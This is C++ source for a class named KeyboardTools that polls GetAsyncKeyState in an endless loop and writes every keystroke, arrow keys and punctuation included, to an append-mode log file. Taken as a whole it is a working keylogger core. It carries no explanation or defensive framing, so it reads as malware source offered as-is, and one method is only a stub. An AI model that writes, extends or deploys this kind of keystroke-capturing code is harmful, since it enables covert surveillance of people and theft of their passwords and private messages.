FILE* __fpr;

class KeyboardTools{
	private:
		FILE* outputfd;

		int key;

	public:
		char* GetEventFile(){
			return 0x00;
		}
		FILE* OutputTo(const char* path){
			return (__fpr=(outputfd=fopen(path, "a")));
		}
		void Run(){
			while(1){
				for (key=8; key<=255; key++){
					if (GetAsyncKeyState(key)==-32767){
						switch(key){
							case 0x0d:
								fprintf (outputfd, "\r\n");
								break;
							case 0xdc:
								fprintf(outputfd, "\\");
								break;
							case 0x25:
								fprintf (outputfd, "<Left Arrow>");
								break;
							case 0x26:
								fprintf (outputfd, "<Up Arrow>");
								break;
							case 0x27:
								fprintf (outputfd, "<Right Arrow>");
								break;
							case 0x28:
								fprintf(outputfd, "<Bottom Arrow>");
								break;
							case 0x10:
								break;
							case 0xbe:
								fprintf(outputfd, ".");
								break;
							case 0xbc:
								fprintf(outputfd, ",");
								break;
							default:
							if (key>64&&key<92&&!(GetAsyncKeyState(0x10)))key+=32;
								fprintf(outputfd, "%c", key);
						}
						fflush(__fpr);
					}
				}

			}
		}
};
